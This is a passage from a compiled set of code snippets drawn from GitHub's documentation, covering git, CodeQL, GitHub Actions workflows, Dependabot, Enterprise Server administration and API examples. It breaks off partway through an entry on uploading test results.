https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/using-source-control-in-your-codespace.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngit fetch upstream\n```\n\n----------------------------------------\n\nTITLE: BQRS Interpretation Command\nDESCRIPTION: This command interprets a single BQRS file according to the provided metadata and generates output in the specified format. It requires the BQRS file, output path, and metadata as mandatory inputs.  The command uses various options to specify output format, include source archive, and fine-tune SARIF output.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/bqrs-interpret.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql bqrs interpret --format=<format> --output=<output> -t=<String=String> [--threads=<num>] [--source-archive=<sourceArchive>] [--source-location-prefix=<sourceLocationPrefix>] <options>... -- <bqrs-file>\n```\n\n----------------------------------------\n\nTITLE: Cloning a Git Repository with Shell\nDESCRIPTION: This command clones a Git repository to your local machine. Replace the URL with the repository you want to clone. This is essential for obtaining the initial COBOL code to be modernized.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/modernizing-legacy-code-with-github-copilot.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngit clone https://github.com/continuous-copilot/modernize-legacy-cobol-app.git\n```\n\n----------------------------------------\n\nTITLE: Create check run helper method - Ruby\nDESCRIPTION: This Ruby code defines a helper method 'create_check_run' that utilizes the Octokit library to create a new check run in a GitHub repository. It uses the repository's full name, a check run name ('Octo RuboCop'), and the SHA of the commit to be checked. The code handles cases where the SHA is located in either the check_suite or check_run object of the payload using a ternary operator.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_22\n\nLANGUAGE: ruby\nCODE:\n```\n    # Create a new check run with status \"queued\"\n    def create_check_run\n      @installation_client.create_check_run(\n        # [String, Integer, Hash, Octokit Repository object] A GitHub repository.\n        @payload['repository']['full_name'],\n        # [String] The name of your check run.\n        'Octo RuboCop',\n        # [String] The SHA of the commit to check\n        # The payload structure differs depending on whether a check run or a check suite event occurred.\n        @payload['check_run'].nil? ? @payload['check_suite']['head_sha'] : @payload['check_run']['head_sha'],\n        # [Hash] 'Accept' header option, to avoid a warning about the API not being ready for production use.\n        accept: 'application/vnd.github+json'\n      )\n    end\n```\n\n----------------------------------------\n\nTITLE: Creating issue with title and body via URL query parameters\nDESCRIPTION: This URL demonstrates how to create a new issue in a GitHub repository with a pre-defined title and body using query parameters. The `title` parameter sets the issue's title to \"New bug report,\" and the `body` parameter pre-fills the issue body with \"Describe the problem.\"\nSOURCE: https://github.com/github/docs/blob/main/content/issues/tracking-your-work-with-issues/using-issues/creating-an-issue.md#_snippet_3\n\nLANGUAGE: URL\nCODE:\n```\nhttps://github.com/octo-org/octo-repo/issues/new?title=New+bug+report&body=Describe+the+problem.\n```\n\n----------------------------------------\n\nTITLE: Injecting Enterprise ID Header with FiddlerScript\nDESCRIPTION: This FiddlerScript snippet adds the `sec-GitHub-allowed-enterprise` header to HTTP requests based on the hostname, enabling network administrators to restrict access to a specific enterprise. It targets github.com, api.github.com, and githubcopilot.com, injecting the specified enterprise ID. The script also sets UI colors for each domain for easier identification during debugging.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/hardening-security-for-your-enterprise/restricting-access-to-githubcom-using-a-corporate-proxy.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\n// Your enterprise id\n   var enterpriseId: String = \"YOUR-ID\";\n\n    //Inject on the web UI\n    if (oSession.HostnameIs(\"github.com\")){\n        oSession.oRequest.headers.Add(\"sec-GitHub-allowed-enterprise\",enterpriseId)\n        oSession[\"ui-color\"] = \"green\";\n    }\n\n    // Inject on API calls\n    if (oSession.HostnameIs(\"api.github.com\")){\n        oSession.oRequest.headers.Add(\"sec-GitHub-allowed-enterprise\",enterpriseId)\n        oSession[\"ui-color\"] = \"blue\";\n        }\n\n    // Inject on Copilot API calls\n    if (oSession.HostnameIs(\"githubcopilot.com\")){\n        oSession.oRequest.headers.Add(\"sec-GitHub-allowed-enterprise\",enterpriseId)\n        oSession[\"ui-color\"] = \"yellow\";\n    }\n```\n\n----------------------------------------\n\nTITLE: Untracking a file with git rm --cached\nDESCRIPTION: This snippet untracks a file that is already checked in before adding a rule to ignore it. It uses the `git rm --cached` command to remove the file from the index, but it remains in the working directory. The `FILENAME` placeholder should be replaced with the actual filename.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/git-basics/ignoring-files.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\ngit rm --cached FILENAME\n```\n\n----------------------------------------\n\nTITLE: Routing jobs using custom labels in workflow YAML\nDESCRIPTION: This code snippet demonstrates how to route jobs to self-hosted runners using a combination of default and custom labels. It specifies that the job should run on a self-hosted Linux runner with x64 architecture and the custom label \"gpu\". The labels operate cumulatively; the runner must have all specified labels to be eligible to process the job.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/using-self-hosted-runners-in-a-workflow.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nruns-on: [self-hosted, linux, x64, gpu]\n```\n\n----------------------------------------\n\nTITLE: Example Input for run_script_step - JSON\nDESCRIPTION: This JSON snippet shows an example input structure for the `run_script_step` command, including arguments such as `entryPointArgs`, `entryPoint`, `environmentVariables`, `prependPath`, and `workingDirectory`. It also includes state information and the command itself.  This object is used to define how a script is executed within a GitHub Actions runner.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/customizing-the-containers-used-by-jobs.md#_snippet_5\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"command\": \"run_script_step\",\n  \"responseFile\": null,\n  \"state\": {\n    \"network\": \"example_network_53269bd575972817b43f7733536b200c\",\n    \"jobContainer\": \"82e8219701fe096a35941d869cf3d71af1d943b5d8bdd718857fb87ac3042480\",\n    \"serviceContainers\": {\n      \"redis\": \"60972d9aa486605e66b0dad4abb678dc3d9116f536579e418176eedb8abb9105\"\n    }\n  },\n  \"args\": {\n    \"entryPointArgs\": [\"-e\", \"/runner/temp/example.sh\"],\n    \"entryPoint\": \"bash\",\n    \"environmentVariables\": {\n      \"NODE_ENV\": \"development\"\n    },\n    \"prependPath\": [\"/foo/bar\", \"bar/foo\"],\n    \"workingDirectory\": \"/__w/octocat-test2/octocat-test2\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting up Dependency Review Action Workflow (Minimal)\nDESCRIPTION: This snippet demonstrates a basic YAML workflow configuration for the Dependency Review action. It sets up a workflow triggered on pull requests, checks out the repository, and then runs the Dependency Review action using `actions/dependency-review-action@v4`.  It requires read access to the repository contents.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/supply-chain-security/understanding-your-software-supply-chain/configuring-the-dependency-review-action.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: 'Dependency Review'\non: [pull_request]\n\npermissions:\n  contents: read\n\njobs:\n  dependency-review:\n    runs-on: {% ifversion ghes %}[self-hosted]{% else %}ubuntu-latest{% endif %}\n    steps:\n     - name: 'Checkout Repository'\n       uses: {% data reusables.actions.action-checkout %}\n     - name: Dependency Review\n       uses: actions/dependency-review-action@v4\n```\n\n----------------------------------------\n\nTITLE: Download a Specific Artifact in GitHub Actions (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to download a specific artifact using the `actions/download-artifact` action. The `name` parameter specifies the name of the artifact to download. If the artifact was uploaded without a specific name, the default name is `artifact`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/storing-and-sharing-data-from-a-workflow.md#_snippet_2\n\nLANGUAGE: YAML\nCODE:\n```\n- name: Download a single artifact\n  uses: {% data reusables.actions.action-download-artifact %}\n  with:\n    name: my-artifact\n```\n\n----------------------------------------\n\nTITLE: Grouping log lines in YAML using PowerShell\nDESCRIPTION: This snippet demonstrates grouping log lines in a GitHub Actions workflow using the `group` and `endgroup` commands in PowerShell.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_14\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  powershell-example:\n    runs-on: windows-latest\n    steps:\n      - name: Group of log lines\n        run: |\n            Write-Output \"::group::My title\"\n            Write-Output \"Inside group\"\n            Write-Output \"::endgroup::\"\n```\n\n----------------------------------------\n\nTITLE: Building container image - Docker CLI\nDESCRIPTION: This command builds a Docker image from a Dockerfile in the current directory and tags it with the name `hello_docker`. It requires a Dockerfile to be present in the current directory.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-container-registry.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\ndocker build -t hello_docker .\n```\n\n----------------------------------------\n\nTITLE: Adding a Runner Scale Set to a Runner Group\nDESCRIPTION: This snippet shows how to add a runner scale set to a specific runner group by setting the `runnerGroup` property in the `values.yaml` file. This configuration determines which organizations or repositories have access to the runner scale set.  The `runnerGroup` value should match the name of the existing runner group.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller.md#_snippet_10\n\nLANGUAGE: yaml\nCODE:\n```\nrunnerGroup: \"Octo-Group\"\n```\n\n----------------------------------------\n\nTITLE: Configure Repository OIDC Customization - JSON\nDESCRIPTION: This JSON snippet shows the request body for configuring a repository to use the organization's default OpenID Connect (OIDC) subject claim template via the REST API.  It disables the use of a custom template, reverting to the organization's default. The endpoint `PUT /repos/{owner}/{repo}/actions/oidc/customization/sub` is used.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect.md#_snippet_11\n\nLANGUAGE: json\nCODE:\n```\n{\n   \"use_default\": false\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Dockerfile\nDESCRIPTION: Defines the Docker image used to run the action. It specifies the base image, copies the entrypoint script to the container, and sets the entrypoint for the container.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/creating-a-docker-container-action.md#_snippet_0\n\nLANGUAGE: Dockerfile\nCODE:\n```\n# Container image that runs your code\nFROM alpine:3.10\n\n# Copies your code file from your action repository to the filesystem path `/` of the container\nCOPY entrypoint.sh /entrypoint.sh\n\n# Code file to execute when the docker container starts up (`entrypoint.sh`)\nENTRYPOINT [\"/entrypoint.sh\"]\n```\n\n----------------------------------------\n\nTITLE: Analyzing Git Traffic with ghe-governor\nDESCRIPTION: The `ghe-governor` command is a tool used to analyze Git traffic patterns on a GitHub Enterprise Server instance. It provides insights into repository access and usage, which can help identify potential bottlenecks or unusual activity.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/monitoring-your-instance/troubleshooting-resource-allocation-problems.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nghe-governor\n```\n\n----------------------------------------\n\nTITLE: Configuring Push Event Triggers with Branch and Tag Patterns in YAML\nDESCRIPTION: This YAML snippet configures a GitHub Actions workflow to trigger on `push` events to specific branches (main, mona/octocat, releases/**) and tags (v2, v1.*). The `branches` patterns are matched against `refs/heads/<branch_name>`, and the `tags` patterns are matched against `refs/tags/<tag_name>`.  The workflow will run whenever a push event occurs on a branch named main, mona/octocat, or any branch starting with releases/, or a tag named v2, or any tag starting with v1..\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/workflows/run-on-specific-branches-or-tags2.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\non:\n  push:\n    # Sequence of patterns matched against refs/heads\n    branches:\n      - main\n      - 'mona/octocat'\n      - 'releases/**'\n    # Sequence of patterns matched against refs/tags\n    tags:\n      - v2\n      - v1.*\n```\n\n----------------------------------------\n\nTITLE: Setting Output Parameter using Bash\nDESCRIPTION: This bash script sets an output parameter by appending a string to the `$GITHUB_OUTPUT` file. The string is formatted as `{name}={value}`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_38\n\nLANGUAGE: bash\nCODE:\n```\necho \"{name}={value}\" >> \"$GITHUB_OUTPUT\"\n```\n\n----------------------------------------\n\nTITLE: Monitor Backup Progress (ghe-backup-progress)\nDESCRIPTION: This command monitors the progress of a backup operation. It can print progress continuously or print the current progress and exit immediately using the `--once` flag.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/backing-up-and-restoring-your-instance/configuring-backups-on-your-instance.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\nbin/ghe-backup-progress\n```\n\n----------------------------------------\n\nTITLE: Configuring A Records for Apex Domain in Shell\nDESCRIPTION: This code snippet shows the IPv4 addresses that should be used when configuring A records for an apex domain to point to GitHub Pages. The snippet lists four IP addresses to ensure redundancy and availability.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/configuring-a-custom-domain-for-your-github-pages-site/managing-a-custom-domain-for-your-github-pages-site.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n185.199.108.153\n185.199.109.153\n185.199.110.153\n185.199.111.153\n```\n\n----------------------------------------\n\nTITLE: Setting execute permissions for scripts (Mac)\nDESCRIPTION: This command sets execute permissions for a shell script file on macOS. This is a prerequisite for the script to be executed as a pre-receive hook.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/enforcing-policies/enforcing-policy-with-pre-receive-hooks/creating-a-pre-receive-hook-script.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nsudo chmod +x SCRIPT_FILE.sh\n```\n\n----------------------------------------\n\nTITLE: Removing a Remote Repository in Git\nDESCRIPTION: This snippet demonstrates how to remove a remote repository using the `git remote rm` command. The `git remote -v` command is used before and after to show existing remotes and verify the removal. It removes a remote named 'destination'.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/git-basics/managing-remote-repositories.md#_snippet_8\n\nLANGUAGE: Shell\nCODE:\n```\n$ git remote -v\n# View current remotes\n> origin  https://{% data variables.product.product_url %}/OWNER/REPOSITORY.git (fetch)\n> origin  https://{% data variables.product.product_url %}/OWNER/REPOSITORY.git (push)\n> destination  https://{% data variables.product.product_url %}/FORKER/REPOSITORY.git (fetch)\n> destination  https://{% data variables.product.product_url %}/FORKER/REPOSITORY.git (push)\n\n$ git remote rm destination\n# Remove remote\n$ git remote -v\n# Verify it's gone\n> origin  https://{% data variables.product.product_url %}/OWNER/REPOSITORY.git (fetch)\n> origin  https://{% data variables.product.product_url %}/OWNER/REPOSITORY.git (push)\n```\n\n----------------------------------------\n\nTITLE: Example JSON Response from REST API\nDESCRIPTION: This JSON snippet represents a sample response from the GitHub REST API when requesting user information. It includes various user attributes such as login, ID, avatar URL, and the crucial `node_id`.  This `node_id` can then be used in GraphQL queries to reference the same user.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/using-global-node-ids.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"login\": \"octocat\",\n  \"id\": 1,\n  \"avatar_url\": \"https://github.com/images/error/octocat_happy.gif\",\n  \"gravatar_id\": \"\",\n  \"url\": \"https://api.github.com/users/octocat\",\n  \"html_url\": \"https://github.com/octocat\",\n  \"followers_url\": \"https://api.github.com/users/octocat/followers\",\n  \"following_url\": \"https://api.github.com/users/octocat/following{/other_user}\",\n  \"gists_url\": \"https://api.github.com/users/octocat/gists{/gist_id}\",\n  \"starred_url\": \"https://api.github.com/users/octocat/starred{/owner}{/repo}\",\n  \"subscriptions_url\": \"https://api.github.com/users/octocat/subscriptions\",\n  \"organizations_url\": \"https://api.github.com/users/octocat/orgs\",\n  \"repos_url\": \"https://api.github.com/users/octocat/repos\",\n  \"events_url\": \"https://api.github.com/users/octocat/events{/privacy}\",\n  \"received_events_url\": \"https://api.github.com/users/octocat/received_events\",\n  \"type\": \"User\",\n  \"site_admin\": false,\n  \"name\": \"monalisa octocat\",\n  \"company\": \"GitHub\",\n  \"blog\": \"https://github.com/blog\",\n  \"location\": \"San Francisco\",\n  \"email\": \"octocat@github.com\",\n  \"hireable\": false,\n  \"bio\": \"There once was...\",\n  \"public_repos\": 2,\n  \"public_gists\": 1,\n  \"followers\": 20,\n  \"following\": 0,\n  \"created_at\": \"2008-01-14T04:33:35Z\",\n  \"updated_at\": \"2008-01-14T04:33:35Z\",\n  \"private_gists\": 81,\n  \"total_private_repos\": 100,\n  \"owned_private_repos\": 100,\n  \"disk_usage\": 10000,\n  \"collaborators\": 8,\n  \"two_factor_authentication\": true,\n  \"plan\": {\n    \"name\": \"Medium\",\n    \"space\": 400,\n    \"private_repos\": 20,\n    \"collaborators\": 0\n  },\n  \"node_id\": \"MDQ6VXNlcjU4MzIzMQ==\"\n}\n```\n\n----------------------------------------\n\nTITLE: Viewing the Log for a Specific Job using GitHub CLI\nDESCRIPTION: This snippet demonstrates how to view the full log for a specific job within a workflow run using the `--log` flag in conjunction with the `-j` or `--job` flag.  Replace `JOB_ID` with the ID of the job.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/viewing-workflow-run-history.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\ngh run view --job JOB_ID --log\n```\n\n----------------------------------------\n\nTITLE: Customizing Labels for Dependabot Pull Requests in YAML\nDESCRIPTION: This YAML snippet shows how to customize the labels applied to Dependabot pull requests for npm dependencies.  It replaces the default labels with custom labels, useful for prioritization or triggering workflows.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/dependabot-version-updates/customizing-dependabot-prs.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n# `dependabot.yml` file with\n# customized npm configuration\n\nversion: 2\nupdates:\n  # Keep npm dependencies up to date\n  - package-ecosystem: \"npm\"\n    directory: \"/\"\n    schedule:\n      interval: \"weekly\"\n    # Raise all npm pull requests with custom labels\n    labels:\n      - \"npm dependencies\"\n      - \"triage-board\"\n```\n\n----------------------------------------\n\nTITLE: Generating a README with Copilot\nDESCRIPTION: This snippet demonstrates using {% data variables.product.prodname_copilot_chat_short %} to generate a README file for a repository.  It shows a prompt that can be used to generate a description of the project. The generated README should then be placed in the root of the repository.\nSOURCE: https://github.com/github/docs/blob/main/content/account-and-profile/setting-up-and-managing-your-github-profile/customizing-your-profile/using-your-github-profile-to-enhance-your-resume.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nWrite a README for my lottery-number-generator repository.\n```\n\n----------------------------------------\n\nTITLE: Creating CodeQL Database for Swift Project with Custom Script\nDESCRIPTION: This snippet creates a CodeQL database for a Swift project using a custom build script. It executes `./scripts/build.sh` which is expected to contain the Swift build commands. It assumes the script exists, is executable, and Swift and CodeQL CLI are installed.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/preparing-your-code-for-codeql-analysis.md#_snippet_18\n\nLANGUAGE: shell\nCODE:\n```\ncodeql database create -l swift -c \"./scripts/build.sh\" swift-database\n```\n\n----------------------------------------\n\nTITLE: Initializing CodeQL Database\nDESCRIPTION: Creates an empty CodeQL database in the specified directory, preparing it for extractor steps. This command sets up the database structure and resolves the location of the appropriate language pack. Subsequent steps involve tracing commands and finalization to prepare the database for querying.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/database-init.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql database init --source-root=<dir> [--language=<lang>[,<lang>...]] [--github-auth-stdin] [--github-url=<url>] [--extractor-option=<extractor-option-name=value>] <options>... -- <database>\n```\n\n----------------------------------------\n\nTITLE: Mounting volumes in a container - YAML\nDESCRIPTION: This YAML snippet demonstrates how to mount volumes in a container within a GitHub Actions workflow. It showcases three different volume mounting methods: using a named Docker volume ('my_docker_volume'), creating an anonymous volume ('/data/my_data'), and creating a bind mount ('/source/directory:/destination/directory'). The `volumes` key is used to define the volume mappings.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/section-running-jobs-in-a-container-volumes.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nvolumes:\n  - my_docker_volume:/volume_mount\n  - /data/my_data\n  - /source/directory:/destination/directory\n```\n\n----------------------------------------\n\nTITLE: Updating GitHub Actions Importer\nDESCRIPTION: Updates the GitHub Actions Importer CLI to the latest version by connecting to the {% data variables.product.prodname_registry %} {% data variables.product.prodname_container_registry %} and ensuring the container image is updated.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-azure-devops-with-github-actions-importer.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer update\n```\n\n----------------------------------------\n\nTITLE: Job Context Example\nDESCRIPTION: This JSON snippet shows the contents of the `job` context, including information about the job's status, container, and service containers. It includes details like container network ID, service container IDs, port mappings, and the overall job status (success, failure, etc.).\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs.md#_snippet_7\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"status\": \"success\",\n  \"container\": {\n    \"network\": \"github_network_53269bd575974817b43f4733536b200c\"\n  },\n  \"services\": {\n    \"postgres\": {\n      \"id\": \"60972d9aa486605e66b0dad4abb638dc3d9116f566579e418166eedb8abb9105\",\n      \"ports\": {\n        \"5432\": \"49153\"\n      },\n      \"network\": \"github_network_53269bd575974817b43f4733536b200c\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Clearing Let's Encrypt settings - Shell\nDESCRIPTION: This command clears the existing settings related to Let's Encrypt configuration on GitHub Enterprise Server. This step is necessary before requesting a new certificate after disabling Let's Encrypt.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/hardening-security-for-your-enterprise/configuring-tls.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nghe-ssl-acme -x\n```\n\n----------------------------------------\n\nTITLE: Configuring Distribution Management for GitHub Packages in pom.xml (XML)\nDESCRIPTION: This XML snippet shows how to configure the `<distributionManagement>` section of the `pom.xml` file to deploy to GitHub Packages. The `id` is set to `github`, and the `url` points to the organization's and repository's Maven endpoint.  This configuration utilizes the GITHUB_TOKEN for authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/publishing-packages/publishing-java-packages-with-maven.md#_snippet_2\n\nLANGUAGE: xml\nCODE:\n```\n<project ...>\n  ...\n  <distributionManagement>\n    <repository>\n      <id>github</id>\n      <name>GitHub Packages</name>\n      <url>https://maven.pkg.github.com/octocat/hello-world</url>\n    </repository>\n  </distributionManagement>\n</project>\n```\n\n----------------------------------------\n\nTITLE: Compiling COBOL Code with GnuCOBOL\nDESCRIPTION: This command compiles multiple COBOL files and links them to create an executable.  It takes COBOL source files (`main.cob`, `operations.cob`, `data.cob`) as input and outputs an executable named `accountsystem`. The `-x` flag creates an executable file.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/modernizing-legacy-code-with-github-copilot.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\ncobc -x main.cob operations.cob data.cob -o accountsystem\n```\n\n----------------------------------------\n\nTITLE: Generated Unit Tests for Price Validation in Python\nDESCRIPTION: These Python unit tests, generated by {% data variables.product.prodname_copilot_chat_short %}, use the `unittest` module to test the `validate_price` function. The tests cover various scenarios, including invalid prices (zero, negative, above limit) and a valid price at the upper limit.  They assert that ValueErrors are raised appropriately for invalid prices and that no error is raised for valid boundary cases.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/testing-code/generate-unit-tests.md#_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nimport unittest\nfrom generate_unit_tests import validate_price\n\nclass TestValidateProduct(unittest.TestCase):\n  def test_price_zero(self):\n    with self.assertRaises(ValueError) as context:\n      validate_price(0)\n    self.assertEqual(str(context.exception), \"Price must be greater than 0\")\n\n  def test_price_negative(self):\n    with self.assertRaises(ValueError) as context:\n      validate_price(-10)\n    self.assertEqual(str(context.exception), \"Price must be greater than 0\")\n\n  def test_price_above_limit(self):\n    with self.assertRaises(ValueError) as context:\n      validate_price(1500)\n    self.assertEqual(str(context.exception), \"Price must be less than or equal to 1000\")\n\n  def test_price_edge_case_zero(self):\n    with self.assertRaises(ValueError) as context:\n      validate_price(0)\n    self.assertEqual(str(context.exception), \"Price must be greater than 0\")\n\n  def test_price_edge_case_max(self):\n    try:\n      validate_price(1000)\n    except ValueError:\n      self.fail(\"validate_price() raised ValueError unexpectedly!\")\n\nif __name__ == '__main__':\n  unittest.main()\n```\n\n----------------------------------------\n\nTITLE: Dry-Run Migration of CircleCI Project with CLI\nDESCRIPTION: This shell command performs a dry-run migration of a specified CircleCI project to GitHub Actions using GitHub Actions Importer. It converts the pipeline to a GitHub Actions workflow and creates output files in the specified directory without opening a pull request.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-circleci-with-github-actions-importer.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer dry-run circle-ci --output-dir tmp/dry-run --circle-ci-project my-circle-ci-project\n```\n\n----------------------------------------\n\nTITLE: Refreshing authentication scopes with GitHub CLI\nDESCRIPTION: This command refreshes the GitHub CLI's authentication scopes, adding the `admin:org_hook` scope. This scope is required to forward organization webhooks. Successful execution updates the CLI's authentication to include the specified scope.\nSOURCE: https://github.com/github/docs/blob/main/content/webhooks/testing-and-troubleshooting-webhooks/using-the-github-cli-to-forward-webhooks-for-testing.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngh auth refresh --scopes admin:org_hook\n```\n\n----------------------------------------\n\nTITLE: Changing Directory to Backup Utilities\nDESCRIPTION: This command changes the current working directory to the extracted `backup-utils` directory.  This is a necessary step to proceed with the backup utilities configuration and execution.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/backing-up-and-restoring-your-instance/configuring-backups-on-your-instance.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ncd backup-utils\n```\n\n----------------------------------------\n\nTITLE: Authorizing Security Group Ingress using AWS CLI\nDESCRIPTION: This snippet demonstrates how to add a security group rule to allow traffic on a specific port using the AWS CLI.  It uses the `aws ec2 authorize-security-group-ingress` command. Replace `SECURITY_GROUP_ID`, `PROTOCOL`, `PORT_NUMBER` and `SOURCE IP RANGE` with the appropriate values.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/installing-your-enterprise-server/setting-up-a-github-enterprise-server-instance/installing-github-enterprise-server-on-aws.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\naws ec2 authorize-security-group-ingress --group-id SECURITY_GROUP_ID --protocol PROTOCOL --port PORT_NUMBER --cidr SOURCE IP RANGE\n```\n\n----------------------------------------\n\nTITLE: Re-running a failed workflow run with gh CLI\nDESCRIPTION: This snippet demonstrates how to re-run a failed workflow run using the `gh run rerun` subcommand. `RUN_ID` should be replaced with the ID of the failed run.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/re-running-workflows-and-jobs.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh run rerun RUN_ID\n```\n\n----------------------------------------\n\nTITLE: Pushing Changes to Remote Branch with Git Push\nDESCRIPTION: This snippet demonstrates how to push local changes to a remote branch using the `git push` command. It pushes the changes from the local `test-branch` to the remote `origin` repository's `test-branch`. This action makes the local changes available in the original pull request.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/committing-changes-to-a-pull-request-branch-created-from-a-fork.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\n$ git push origin test-branch\n> Counting objects: 32, done.\n> Delta compression using up to 8 threads.\n> Compressing objects: 100% (26/26), done.\n> Writing objects: 100% (29/29), 74.94 KiB | 0 bytes/s, done.\n> Total 29 (delta 8), reused 0 (delta 0)\n> To https://{% data variables.product.product_url %}/USERNAME/FORK-OF-THE-REPOSITORY.git\n> 12da2e9..250e946  TEST-BRANCH -> TEST-BRANCH\n```\n\n----------------------------------------\n\nTITLE: REST API Security Review Prompt Example\nDESCRIPTION: This Markdown snippet showcases a prompt file (`API security review.prompt.md`) containing reusable security practices for REST APIs. It provides guidelines for security reviews, including endpoint protection, input validation, rate limiting, and logging/monitoring security events, ensuring that REST APIs adhere to security best practices.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/customizing-copilot/about-customizing-github-copilot-chat-responses.md#_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\nSecure REST API review:\n- Ensure all endpoints are protected by authentication and authorization\n- Validate all user inputs and sanitize data\n- Implement rate limiting and throttling\n- Implement logging and monitoring for security events\n…\n```\n\n----------------------------------------\n\nTITLE: Setting Server Port - Ruby\nDESCRIPTION: This code snippet shows how to set the port for the Sinatra server using an environment variable. It retrieves the port number from the `PORT` environment variable and configures the Sinatra application to listen on that port. This is commonly used in deployment environments.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_55\n\nLANGUAGE: ruby\nCODE:\n```\nset :port, ENV['PORT']\n```\n\n----------------------------------------\n\nTITLE: Uploading Test Results as Artifacts (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to upload test results as artifacts in a GitHub Actions workflow. It runs Pester tests, exports the results to an XML file, and then uploads the XML file as an artifact named `ubuntu-Unit-Tests` using the `upload-artifact` 